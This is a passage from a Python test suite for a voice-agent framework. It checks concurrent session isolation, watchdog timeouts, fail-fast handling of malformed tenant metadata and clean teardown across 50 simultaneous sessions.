            mock_speech_handle = MagicMock()
            mock_speech_handle.done.return_value = False
            callbacks: list[Any] = []
            mock_speech_handle.add_done_callback.side_effect = lambda cb: callbacks.append(cb)

            mock_room_b = MagicMock()
            mock_room_b.disconnect = AsyncMock()

            mock_job_ctx_b = MagicMock()
            mock_job_ctx_b.room = mock_room_b
            mock_job_ctx_b.delete_room = AsyncMock()
            mock_job_ctx_b.shutdown = MagicMock()

            mock_run_ctx_b = MagicMock()
            mock_run_ctx_b.speech_handle = mock_speech_handle
            mock_run_ctx_b.session = None
            mock_run_ctx_b.room = mock_room_b
            mock_run_ctx_b.job_ctx = mock_job_ctx_b

            async def _run_job_a() -> str:
                return await webhook_tool({"date": "2026-11-21"})

            async def _run_job_b() -> str:
                farewell = await end_call_tool(mock_run_ctx_b)
                # Deliberately do NOT invoke callbacks - simulate hung speech handle
                # Wait for drain_timeout_seconds (0.1s) plus margin to elapse
                await asyncio.sleep(0.18)
                return farewell

            # Concurrently execute both jobs
            result_a, result_b = await asyncio.gather(_run_job_a(), _run_job_b())

            # Job A completed without issue
            data_a = json.loads(result_a)
            assert data_a["status"] == "available"
            assert "2026-11-21T09:00:00Z" in data_a["slots"]

            # Job B forced teardown via timeout watchdog
            assert result_b == "Goodbye from hanging session!"
            mock_room_b.disconnect.assert_awaited_once()
            mock_job_ctx_b.delete_room.assert_awaited_once()
            mock_job_ctx_b.shutdown.assert_called_once_with(reason="end_call")


# ==============================================================================
# 4. Multi-Tenant Fault Tolerance & Boundary Isolation
# ==============================================================================
class TestMultiTenantFaultToleranceAndBoundaryConditions:
    """Verifies worker resilience when concurrent tenants encounter errors or timeouts."""

    @pytest.mark.asyncio
    async def test_malformed_tenant_metadata_fails_fast_without_affecting_healthy_tenant(self):
        """Verifies that an incoming tenant job with corrupt/missing metadata fails fast
        with MetadataValidationError without crashing or interrupting concurrent healthy jobs."""
        coordinator = SessionCoordinator()
        shared_userdata: dict[str, Any] = {}

        # Healthy config
        healthy_config = SessionConfig(
            models=ModelsConfig(provider="gemini", model="gemini-3.8-live"),
            instructions=InstructionsConfig(system_prompt="Healthy tenant instructions"),
            voice=VoiceConfig(voice_id="Aoede"),
        )
        ctx_healthy = make_mock_job_context(
            "job_healthy", "room_healthy", json.dumps(healthy_config.model_dump()), shared_userdata=shared_userdata
        )

        # Malformed metadata (missing models and instructions)
        malformed_metadata = json.dumps({"version": "1.0", "agent": {"name": "corrupt"}})
        ctx_corrupt = make_mock_job_context(
            "job_corrupt", "room_corrupt", malformed_metadata, shared_userdata=shared_userdata
        )

        mock_agent_session = MagicMock(spec=AgentSession)
        mock_agent_session.start = AsyncMock()
        mock_agent_session.say = AsyncMock()
        mock_agent_session.aclose = AsyncMock()

        with (
            patch("agent_framework.core.session.ModelFactory.create_model", return_value=MagicMock()),
            patch("agent_framework.core.session.AgentSession", return_value=mock_agent_session),
            patch("agent_framework.reporting.dispatcher.ReportingDispatcher.send_session_report", new_callable=AsyncMock),
        ):
            # Run healthy job and corrupt job concurrently
            results = await asyncio.gather(
                coordinator.run(ctx_healthy),
                coordinator.run(ctx_corrupt),
                return_exceptions=True,
            )

            # Corrupt job failed fast with MetadataValidationError
            assert isinstance(results[1], MetadataValidationError)

            # Healthy job succeeded without being affected
            assert results[0] is None
            sc_healthy = get_session_context(ctx_healthy)
            assert sc_healthy is not None
            assert sc_healthy.status == "running"
            assert sc_healthy.session_config.instructions.system_prompt == "Healthy tenant instructions"

            # Corrupt job context is cleanly detached
            assert get_session_context(ctx_corrupt) is None

            # Teardown healthy
            await coordinator.teardown(ctx_healthy)
            assert get_session_context(ctx_healthy) is None
            assert len(shared_userdata) == 0

    @pytest.mark.asyncio
    async def test_concurrent_session_watchdogs_isolation(self):
        """Verifies that when Job 1 reaches max call duration, its watchdog triggers teardown
        for Job 1 only, leaving Job 2's session completely running and intact."""
        coordinator = SessionCoordinator()
        shared_userdata: dict[str, Any] = {}

        # Job 1: short max duration (30s - minimum valid schema value)
        cfg1 = SessionConfig(
            models=ModelsConfig(provider="gemini", model="gemini-3.8-live"),
            instructions=InstructionsConfig(system_prompt="Short lived session"),
            voice=VoiceConfig(voice_id="Aoede"),
            session={"max_duration_seconds": 30, "participant_join_timeout_seconds": 5.0},  # type: ignore
        )

        # Job 2: long max duration (300s)
        cfg2 = SessionConfig(
            models=ModelsConfig(provider="gemini", model="gemini-3.8-live"),
            instructions=InstructionsConfig(system_prompt="Long lived session"),
            voice=VoiceConfig(voice_id="Puck"),
            session={"max_duration_seconds": 300, "participant_join_timeout_seconds": 5.0},  # type: ignore
        )

        ctx1 = make_mock_job_context("job_short", "room_short", json.dumps(cfg1.model_dump()), shared_userdata=shared_userdata)
        ctx2 = make_mock_job_context("job_long", "room_long", json.dumps(cfg2.model_dump()), shared_userdata=shared_userdata)

        def mock_sess(*args: Any, **kwargs: Any) -> MagicMock:
            sess = MagicMock(spec=AgentSession)
            sess.start = AsyncMock()
            sess.aclose = AsyncMock()
            return sess

        original_sleep = asyncio.sleep

        async def _mock_sleep(duration, *args, **kwargs):
            if duration == 30:
                # Accelerate Job 1's 30s watchdog to 0.02s
                await original_sleep(0.02)
                return
            elif duration == 300:
                # Job 2's 300s watchdog sleeps a long time
                await original_sleep(100)
                return
            await original_sleep(duration, *args, **kwargs)

        with (
            patch("agent_framework.core.session.ModelFactory.create_model", return_value=MagicMock()),
            patch("agent_framework.core.session.AgentSession", side_effect=mock_sess),
            patch("agent_framework.reporting.dispatcher.ReportingDispatcher.send_session_report", new_callable=AsyncMock),
            patch("asyncio.sleep", side_effect=_mock_sleep),
        ):
            await coordinator.run(ctx1)
            await coordinator.run(ctx2)

            sc1 = get_session_context(ctx1)
            sc2 = get_session_context(ctx2)
            assert sc1 is not None and sc1.is_active
            assert sc2 is not None and sc2.is_active

            # Wait for Job 1's accelerated watchdog to trigger
            await original_sleep(0.08)

            # Job 1 should have timed out and terminated
            assert not sc1.is_active
            assert sc1.status == "timed_out"
            assert "Max duration" in (sc1.termination_reason or "")
            assert get_session_context(ctx1) is None

            # Job 2 MUST still be running and active!
            assert sc2.is_active
            assert sc2.status == "running"
            assert get_session_context(ctx2) is sc2

            # Clean up Job 2
            await coordinator.teardown(ctx2)
            assert not sc2.is_active
            assert get_session_context(ctx2) is None
            assert len(shared_userdata) == 0

    @pytest.mark.asyncio
    async def test_concurrency_saturation_scale_50_sessions(self):
        """Saturation stress test: Concurrently validates, registers, and runs 50 distinct tenant jobs
        on the same worker process. Verifies event loop responsiveness, zero cross-talk, and 100% clean teardown.
        """
        coordinator = SessionCoordinator()
        shared_userdata: dict[str, Any] = {}
        num_jobs = 50
        contexts: list[MagicMock] = []

        for i in range(num_jobs):
            config = SessionConfig(
                agent={"name": f"scale_agent_{i}", "role": f"role_{i % 5}"},
                models=ModelsConfig(
                    provider="gemini",
                    model="gemini-3.8-live" if i % 2 == 0 else "gemini-3.8-live-extended-thinking",
                ),
                instructions=InstructionsConfig(
                    system_prompt=f"Instructions for saturation job {i}."
                ),
                voice=VoiceConfig(voice_id=["Aoede", "Puck", "Charon", "Fenrir", "Kore"][i % 5]),
                reporting=ReportingConfig(
                    enabled=True,
                    endpoint=ReportingEndpointConfig(url=f"https://telemetry.tenant{i}.com/report"),
                ),
            )
            ctx = make_mock_job_context(
                job_id=f"job_scale_{i}",
                room_name=f"room_scale_{i}",
                metadata_json=json.dumps(config.model_dump()),
                shared_userdata=shared_userdata,
            )
            contexts.append(ctx)

        mock_sess = MagicMock(spec=AgentSession)
        mock_sess.start = AsyncMock()
        mock_sess.say = AsyncMock()
        mock_sess.aclose = AsyncMock()

        start_time = asyncio.get_running_loop().time()

        with (
            patch("agent_framework.core.session.ModelFactory.create_model", side_effect=lambda cfg: MagicMock(id=f"model_{cfg.agent.name}")),
            patch("agent_framework.core.session.AgentSession", return_value=mock_sess),
            patch("agent_framework.reporting.dispatcher.ReportingDispatcher.send_session_report", new_callable=AsyncMock),
        ):
            # Concurrently dispatch 50 sessions
            await asyncio.gather(*(coordinator.run(ctx) for ctx in contexts))

            elapsed_setup = asyncio.get_running_loop().time() - start_time
            # Setup of 50 sessions should complete within 3.5 seconds
            assert elapsed_setup < 3.5

            # Verify all 50 sessions exist and are isolated in shared userdata
            assert len(shared_userdata) == num_jobs
            for i, ctx in enumerate(contexts):
                sc = get_session_context(ctx)
                assert sc is not None and sc.is_active
                assert sc.job_id == f"job_scale_{i}"
                assert sc.session_config.instructions.system_prompt == f"Instructions for saturation job {i}."
                assert sc.model is not None and sc.model.id == f"model_scale_agent_{i}"
                assert f"_agent_framework_session_context:job_scale_{i}" in shared_userdata

            # Concurrently teardown all 50 sessions
            await asyncio.gather(*(coordinator.teardown(ctx) for ctx in contexts))

            # Verify 100% clean detachment across all 50 jobs
            assert len(shared_userdata) == 0
            for ctx in contexts:
                assert get_session_context(ctx) is None
